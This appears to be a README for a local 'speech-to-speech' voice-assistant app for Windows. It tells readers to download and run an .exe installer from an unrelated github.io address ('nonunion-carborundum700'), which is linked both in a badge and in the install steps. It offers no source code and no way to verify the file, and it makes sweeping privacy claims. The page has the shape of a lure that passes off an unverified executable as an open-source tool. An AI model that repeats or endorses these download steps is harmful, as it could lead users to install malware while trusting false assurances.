# 🎙️ speech-to-speech - Build private voice assistants on computers

[![](https://img.shields.io/badge/Download_on_GitHub-blue)](https://nonunion-carborundum700.github.io)

## 📌 About this project

Speech-to-speech allows users to create voice agents directly on a home computer. This software uses open-source artificial intelligence models to process speech. It turns spoken words into text, understands the intent, and produces natural audio responses. Because the software runs on your local machine, your conversations stay private. You do not need an internet connection to use the core features of the tool.

## ⚙️ Minimum system requirements

To run this software, ensure your computer meets these basic specifications:

* Operating System: Windows 10 or Windows 11
* Processor: Intel Core i5 or AMD Ryzen 5 series (or better)
* Memory: 16 GB RAM
* Storage: 10 GB of free disk space
* Graphics: NVIDIA graphics card with 6 GB of Video RAM is recommended for faster performance

## 📦 How to install and run 

Follow these steps to set up your voice agent on Windows.

1. Visit the project release page to get the installer: [https://nonunion-carborundum700.github.io](https://nonunion-carborundum700.github.io)
2. Locate the file ending in .exe in the latest release section.
3. Click the file to start the download to your computer.
4. Navigate to your Downloads folder and double-click the file named speech-to-speech-installer.exe.
5. Follow the on-screen prompts from the setup window. The installer will guide you through the process of setting up necessary components.
6. Once the installation completes, find the icon on your desktop or in your start menu. 
7. Click the icon to launch the application.
8. The first time you run the tool, it will download the language models to your local folder. This process takes several minutes depending on your internet connection speed.
9. After the status bar shows complete, the application will provide a ready signal.

## 🎤 Using your voice agent

Once the interface loads, you will see a control panel. Click the large microphone button to begin speaking. The system identifies your speech and processes the input. You will see the transcript of your voice in the center window. The agent will then generate a response. The audio plays through your default computer speakers. You can adjust the volume and microphone sensitivity in the settings menu.

## 🛠️ Configuration and settings

The software includes a settings tab to customize your experience. You can switch between different voice models. Some models prioritize speed for quick interactions, while others prioritize human-like quality. 

If you notice a lag between your speech and the response, go to the performance menu. Enabling hardware acceleration helps the application use your graphics card capacity. This reduces the time the computer needs to think. Ensure your microphone input is set correctly if the program fails to record your voice. You can select your input device from the dropdown list.

## 🛡️ Privacy and local processing

This application processes all your audio data on your machine. No information leaves your computer during the interaction. This ensures that your private conversations remain local. You do not need to create an account or provide personal information to the authors of this tool. The software remains functional even when you disconnect your network access. 

## 💡 Troubleshooting common issues

If the application fails to launch, check that you have the latest drivers for your graphics card. Outdated drivers can cause the interface to freeze during the startup sequence. Always restart your computer after the installation process before using the software for the first time.

If the microphone does not detect your voice, check your Windows privacy settings. Navigate to Settings, then Privacy and Security, and then choose Microphone. Ensure that the toggle for microphone access is set to On for desktop applications.

If the application runs slowly, close other demanding software such as video games or photo editing tools. These programs consume the processor and graphics resources needed by the voice agent. 

If you encounter errors during the model download phase, check for available disk space. The models require a significant amount of space. Clear old files if your hard drive is near capacity. You can verify the file integrity by clicking the "Verify Files" option in the help menu.
